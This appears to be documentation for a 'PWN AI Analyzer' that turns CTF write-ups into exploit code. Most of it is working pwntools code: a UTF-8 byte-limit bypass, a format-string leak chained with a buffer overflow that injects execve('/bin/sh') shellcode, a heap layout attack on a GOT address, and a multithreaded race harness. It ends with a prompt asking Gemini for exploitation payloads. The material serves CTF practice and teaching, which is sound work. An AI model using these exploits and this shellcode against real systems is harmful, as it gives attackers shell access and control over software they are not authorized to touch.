# Advanced PWN Techniques

## MindCrafters Techniques Implementation

This document details the advanced techniques extracted from real CTF writeups and implemented in the PWN AI Analyzer system.

---

## UTF-8 Byte Bypass

**Source**: L3akCTF 2025 - Safe Gets Challenge  
**Technique**: Exploits character vs byte counting differences in Python

### Problem
- Buffer overflow beyond 255 bytes required
- Python firewall limits input to 255 characters
- Local exploitation works, remote fails due to character limit

### Solution
```python
def utf8_byte_bypass_technique(self, max_chars=255):
    # UTF-8 character that occupies 3 bytes but counts as 1 character
    t_in_circle_utf8 = "ⓣ".encode("utf-8")  # 3 bytes
    
    # Calculate payload that exceeds byte limit
    utf8_chars = 30  # Use 30 UTF-8 characters (90 bytes)
    null_bytes = 190  # Fill with nulls
    
    payload = t_in_circle_utf8 * utf8_chars
    payload += b'\x00' * null_bytes
    
    # Add win function address if exists
    if 'win' in self.binary_info.get('symbols', {}):
        win_addr = self.binary_info['symbols']['win']
        payload += p64(win_addr + 5)  # +5 to skip prologue
    
    return payload
```

### Key Insight
Python counts characters, not bytes. UTF-8 characters can occupy multiple bytes while counting as single characters, allowing bypass of character-based limits.

---

## Multi-Stage Format String Exploitation

**Source**: L3akCTF 2025 - The Goose Challenge  
**Technique**: Complex 4-stage sequential exploitation

### Stages

#### Stage 1: Number Guessing
```python
# Initial overflow to leak the number
payload1 = 64 * b'\x01'
p.sendlineafter(b'How shall we call you?', payload1)
digit = ord(p.recvn(1))
```

#### Stage 2: Format String Leak
```python
# Vulnerable printf(name) without format specifier
format_payload = f"%{1}$p".encode()
p.sendlineafter(b"what's your name again?", format_payload)
leaked_addr = int(re.search(rb'0x[0-9a-fA-F]+', p.recv()).group(0), 16)
```

#### Stage 3: Address Calculation
```python
# Calculate shellcode injection address
shellcode_addr = leaked_addr + 0x52 + 8
```

#### Stage 4: Buffer Overflow + Custom Shellcode
```python
# Vulnerable gets() without bounds checking
shellcode = asm(shellcraft.sh())
payload = b'A' * 72 + p64(shellcode_addr) + shellcode
p.sendline(payload)
```

### Implementation
```python
def format_string_leak_and_exploit(self):
    if not self.target:
        return None
    
    # Phase 1: Stack address leak
    format_payload = f"%{1}$p".encode()
    self.target.sendlineafter(b"name", format_payload)
    
    recv_data = self.target.recv()
    match = re.search(rb'0x[0-9a-fA-F]+', recv_data)
    
    if match:
        leaked_addr = int(match.group(0), 16)
        shellcode_addr = leaked_addr + 0x52 + 8
        shellcode = self.generate_custom_shellcode()
        
        payload = b'A' * 72 + p64(shellcode_addr) + shellcode
        return payload
```

---

## Heap Feng Shui

**Technique**: Controlled heap layout manipulation for reliable exploitation

### Concept
Heap Feng Shui involves carefully arranging heap chunks to create predictable conditions for exploitation.

### Implementation
```python
def heap_feng_shui_technique(self):
    # Phase 1: Prepare heap layout
    chunk_sizes = [0x20, 0x30, 0x40, 0x50, 0x60]
    
    for i, size in enumerate(chunk_sizes):
        payload = f"alloc {size}".encode()
        self.target.sendline(payload)
    
    # Phase 2: Create controlled fragmentation
    for i in range(0, len(chunk_sizes), 2):
        payload = f"free {i}".encode()
        self.target.sendline(payload)
    
    # Phase 3: Exploit fragmentation
    exploit_size = 0x38
    exploit_payload = b'A' * 0x18
    exploit_payload += p64(0x41)      # Fake chunk size
    exploit_payload += p64(0x602060)  # Target address (GOT entry)
    
    self.target.sendline(f"alloc {exploit_size}".encode())
    self.target.sendline(exploit_payload)
    
    return True
```

### Process
1. **Layout Preparation** - Allocate chunks with specific sizes
2. **Controlled Fragmentation** - Free alternating chunks to create gaps
3. **Exploitation** - Allocate in specific gap and overflow to adjacent chunk

---

## Advanced Race Conditions

**Technique**: Precise timing attacks using multiple threads

### Implementation
```python
def advanced_race_condition_exploit(self, num_threads=50):
    class RaceExploiter:
        def __init__(self, binary_path):
            self.binary_path = binary_path
            self.success = False
            self.result = None
            self.lock = threading.Lock()
        
        def worker_thread(self, thread_id):
            try:
                p = process(self.binary_path)
                
                # Critical timing specific
                time.sleep(0.0001 * thread_id)
                
                # Race condition specific payload
                race_payload = f"race_thread_{thread_id}".encode()
                p.sendline(race_payload)
                
                response = p.recvall(timeout=1)
                
                with self.lock:
                    if b"flag" in response.lower():
                        self.success = True
                        self.result = response
                
                p.close()
            except Exception:
                pass
    
    exploiter = RaceExploiter(self.binary_path)
    threads = []
    
    # Launch concurrent threads
    for i in range(num_threads):
        t = threading.Thread(target=exploiter.worker_thread, args=(i,))
        threads.append(t)
        t.start()
    
    # Wait for results
    for t in threads:
        t.join()
    
    return exploiter.success, exploiter.result
```

### Strategy
- **Multiple Threads** - Launch 50+ concurrent threads
- **Staggered Timing** - Each thread has slightly different delay
- **Race Window** - Target ~1ms window between operations
- **Automatic Detection** - Detect successful condition automatically

---

## Custom Shellcode Generation

**Technique**: Optimized shellcode for specific scenarios

### Implementation
```python
def generate_custom_shellcode(self):
    # Shellcode for execve("/bin/sh", NULL, NULL)
    shellcode = asm("""
        xor rax, rax
        push rax
        mov rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        push rax
        push rdi
        mov rsi, rsp
        mov rdx, rax
        mov rax, 59
        syscall
    """)
    
    return shellcode
```

### Features
- **Null-free** - Avoids null bytes that terminate strings
- **Position Independent** - Works regardless of injection address
- **Minimal Size** - Optimized for space constraints
- **Reliable** - Tested across multiple architectures

---

## Automatic Challenge Detection

**Technique**: Pattern recognition for automatic technique selection

### Implementation
```python
def detect_mindcrafters_challenge_type(self):
    challenge_patterns = {
        "safe_gets_utf8": [b"max", b"255", b"bytes", b"character", b"input"],
        "the_goose_format": [b"honk", b"printf", b"name", b"guess"],
        "heap_challenge": [b"malloc", b"free", b"chunk", b"heap"],
        "rop_challenge": [b"system", b"/bin/sh", b"gadget", b"rop"],
        "race_condition": [b"thread", b"pthread", b"concurrent", b"race"]
    }
    
    detected_types = []
    
    # Analyze binary strings
    result = subprocess.run(
        ['strings', self.binary_path],
        capture_output=True, text=True, timeout=10
    )
    
    if result.returncode == 0:
        binary_strings = result.stdout.lower().encode()
        
        for challenge_type, patterns in challenge_patterns.items():
            matches = sum(1 for pattern in patterns if pattern in binary_strings)
            if matches >= 2:  # At least 2 patterns match
                detected_types.append((challenge_type, matches))
        
        # Sort by number of matches
        detected_types.sort(key=lambda x: x[1], reverse=True)
        
        if detected_types:
            best_match = detected_types[0][0]
            return best_match
    
    return "unknown"
```

### Process
1. **String Analysis** - Extract strings from binary
2. **Pattern Matching** - Compare against known challenge patterns
3. **Confidence Scoring** - Rank matches by pattern frequency
4. **Technique Selection** - Choose most appropriate technique

---

## Integration with AI

All techniques are integrated with Gemini AI for enhanced analysis and contextual understanding.

### AI-Enhanced Analysis
```python
def ai_analyze_binary_advanced(self, file_path, analysis):
    prompt = f"""
    Analyze this binary executable for CTF with detailed information:
    
    File: {os.path.basename(file_path)}
    Architecture: {analysis.get('architecture', 'unknown')}
    Protections: {analysis.get('protections', {})}
    Challenge type detected: {analysis.get('challenge_type', 'unknown')}
    Vulnerable functions: {[f['function'] for f in analysis.get('vulnerable_functions', [])]}
    Recommended techniques: {analysis.get('exploitation_techniques', [])}
    
    As a PWN and CTF expert, please:
    1. Confirm or correct the identified challenge type
    2. Provide a step-by-step exploitation plan
    3. Identify probable offset for buffer overflow
    4. Suggest specific payloads
    5. Mention additional tools needed
    6. If you detect flag patterns or methods to obtain them, describe them
    
    Respond with specific technical details for PWN.
    """
    
    response = self.model.generate_content(prompt)
    analysis["ai_analysis_advanced"] = response.text
    
    # Extract specific information from AI analysis
    self.extract_ai_insights(response.text, analysis)
```

This integration allows the system to:
- **Contextual Understanding** - AI provides deeper insight into challenges
- **Technique Refinement** - AI suggests improvements to detected techniques
- **Payload Optimization** - AI helps optimize payloads for specific scenarios
- **Educational Value** - AI explains the reasoning behind technique selection